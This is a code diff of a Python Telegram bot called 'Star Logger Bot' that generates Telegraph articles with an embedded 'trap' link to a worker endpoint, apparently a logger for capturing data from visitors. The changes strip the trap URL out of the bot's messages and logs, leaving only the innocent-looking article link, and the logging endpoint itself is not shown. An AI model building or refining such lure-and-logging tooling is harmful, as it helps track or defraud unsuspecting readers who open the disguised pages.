@@ -24,7 +24,7 @@ DB_PATH     = os.environ.get("DB_PATH") or "/tmp/database2.db"
 CHANNEL_ID    = -1004336153105  # ID канала Project
 GROUP_ID      = -1004382024668  # ID группы для проверки подписки
 CHANNEL_LINK  = "https://t.me/+c3xyHely39ozNDYy"
-GROUP_LINK    = "https://t.me/+c3xyHely39ozNDYy" # ЗАМЕНИ НА ИНВАЙТ В ГРУППУ, ЕСЛИ ОН ДРУГОЙ
+GROUP_LINK    = "https://t.me/+c3xyHely39ozNDYy" # ЗАМЕНИ, ЕСЛИ ЕСТЬ ОТДЕЛЬНАЯ ССЫЛКА НА ГРУППУ
 SUPPORT       = "@boyfrer"
 PREMIUM_PRICE = 5.0
 
@@ -180,13 +180,13 @@ def make_article(title, text, img_url, template_name, author_id, author_username
     html = build_html(text, trap_url, img_url)
     page = telegraph.create_page(title=title, html_content=html)
     url = f"https://telegra.ph/{page['path']}"
+    
+    # Ссылка на ловушку убрана из сообщения
     msg = (
         f"<b>⭐️Star Logger Bot⭐️</b>\n"
         f"<b>⭐️Статья создана</b>\n"
         f"=============================\n"
         f"⭐️Тема: {title}\n"
-        f"⭐️Ловушка: <code>{trap_url}</code>\n"
-        f"=============================\n"
         f"⭐️Ссылка: {url}"
     )
     return msg, url, slug
@@ -508,7 +508,7 @@ def _make_step(message):
     username = message.from_user.username or str(message.from_user.id)
     msg, url, slug = make_article(title, text, img, TEMPLATES[key], message.from_user.id, username)
     bot.send_message(message.chat.id, msg)
-    send_log(f"🔔 {message.from_user.id}\n⭐️{TEMPLATES[key]}\nТема: {title}\nЛовушка: <code>{WORKER_URL}/t/{slug}</code>\nСтатья: {url}")
+    send_log(f"🔔 {message.from_user.id}\n⭐️{TEMPLATES[key]}\nТема: {title}\nСтатья: {url}")
 
 @bot.callback_query_handler(func=lambda c: c.data == "tpl_custom")
 def cb_custom(call):
@@ -536,7 +536,7 @@ def _cust_img(message):
     username = message.from_user.username or str(message.from_user.id)
     msg, url, slug = make_article(d["title"], d["text"], img, "custom", message.from_user.id, username)
     bot.send_message(message.chat.id, msg)
-    send_log(f"🔔 {message.from_user.id}\n⭐️custom\nТема: {d['title']}\nЛовушка: <code>{WORKER_URL}/t/{slug}</code>\nСтатья: {url}")
+    send_log(f"🔔 {message.from_user.id}\n⭐️custom\nТема: {d['title']}\nСтатья: {url}")
 
 # ---------- ENTRY ----------
 if __name__ == "__main__":
